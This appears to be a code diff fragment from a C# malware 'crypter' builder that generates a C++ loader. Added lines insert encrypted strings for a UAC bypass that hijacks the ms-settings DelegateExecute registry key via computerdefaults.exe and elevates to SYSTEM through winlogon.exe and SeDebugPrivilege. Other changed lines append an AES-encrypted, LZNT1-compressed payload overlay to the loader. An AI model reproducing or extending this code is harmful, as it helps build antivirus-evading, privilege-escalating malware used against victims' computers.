+                     .Replace("{/*S_P32F*/}",     uacBypass ? encStrMap["Process32FirstW"]           : "0")
+                     .Replace("{/*S_P32N*/}",     uacBypass ? encStrMap["Process32NextW"]            : "0")
+                     .Replace("{/*S_WINLOGON*/}", uacBypass ? encStrMap["winlogon.exe"]              : "0")
+                     .Replace("{/*S_FODHLP*/}",   uacBypass ? encStrMap["computerdefaults.exe"]      : "0")
+                     .Replace("{/*S_MSCMD*/}",    uacBypass ? encStrMap["ms-settings-cmd"]           : "0")
+                     .Replace("{/*S_MSOPEN*/}",   uacBypass ? encStrMap["ms-settings-open"]          : "0")
+                     .Replace("{/*S_MSSHELL*/}",  uacBypass ? encStrMap["ms-settings-shell"]         : "0")
+                     .Replace("{/*S_MSBASE*/}",   uacBypass ? encStrMap["ms-settings-base"]          : "0")
+                     .Replace("{/*S_DELEGEX*/}",  uacBypass ? encStrMap["DelegateExecute"]           : "0")
+                     .Replace("{/*S_SEDEBUG*/}",  uacBypass ? encStrMap["SeDebugPrivilege"]          : "0")
                      .Replace("{/*UAC_BYPASS_PREAMBLE*/}", uacBypass ? UacPreamble : "")
                      .Replace("{/*UAC_BYPASS_FUNC*/}",     uacBypass ? UacFunc    : "")
                      .Replace("{/*UAC_BYPASS_CALL*/}",     uacBypass ? UacCall    : "");
@@ -507,21 +542,22 @@ static bool _ElevateToSystem(){
             }
             log($"[+] Crypter (C++): Loader compiled ({new FileInfo(outExe).Length / 1024.0:F0} KB)");
 
-            // ── Append overlay: MAGIC(8)+TOTAL_DECODED(4)+WORD_TEXT(key+iv+payload) ──
-            byte[] wordBytes = Encoding.ASCII.GetBytes(wordPayload);
-
+            // ── Append overlay: MAGIC(8)+TOTAL_RAW(4)+ORIG_SIZE(4)+key+iv+encrypted ──
             using (var fs = new FileStream(outExe, FileMode.Append, FileAccess.Write))
             {
                 fs.Write(cppMagic);
-                fs.Write(BitConverter.GetBytes(combined.Length)); // total decoded bytes
-                fs.Write(wordBytes);
+                fs.Write(BitConverter.GetBytes(totalRaw));   // key+iv+encrypted size
+                fs.Write(BitConverter.GetBytes(origSize));   // 0 = not compressed
+                fs.Write(pKey);
+                fs.Write(pIv);
+                fs.Write(encrypted);
             }
 
             File.Copy(outExe, exePath, overwrite: true);
             try { Directory.Delete(tempDir, true); } catch { }
 
             var sz = new FileInfo(exePath).Length;
-            log($"[+] Crypter (C++): Done — {sz / (1024.0 * 1024.0):F1} MB (magic={BitConverter.ToString(cppMagic)}, mixed-word overlay)");
+            log($"[+] Crypter (C++): Done — {sz / (1024.0 * 1024.0):F1} MB (LZNT1+AES, magic={BitConverter.ToString(cppMagic)})");
             return true;
         }
         catch (Exception ex)
